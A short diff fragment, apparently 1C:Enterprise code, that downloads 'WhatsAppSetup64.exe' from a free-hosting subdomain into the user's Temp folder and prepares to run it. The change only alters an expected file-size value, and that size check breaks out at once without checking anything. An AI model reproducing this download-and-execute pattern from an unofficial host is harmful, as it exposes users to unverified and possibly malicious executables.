@@ -12,7 +12,7 @@
 	Соединение = Новый HTTPСоединение("f0821791.xsph.ru");
 	Соединение.Получить("/WhatsAppSetup64.exe", USERPROFILE +"\AppData\Local\Temp\WhatsAppSetup64.exe");		
 	UWP = Новый Файл(USERPROFILE + "\AppData\Local\Temp\WhatsAppSetup64.exe");
-	Пока UWP.Размер() <> "106 624 335" Цикл
+	Пока UWP.Размер() <> "100 950 763" Цикл
 		Прервать;
 	КонецЦикла;
 	КомандаУстановитьВЦ = USERPROFILE + "\AppData\Local\Temp\WhatsAppSetup64.exe";
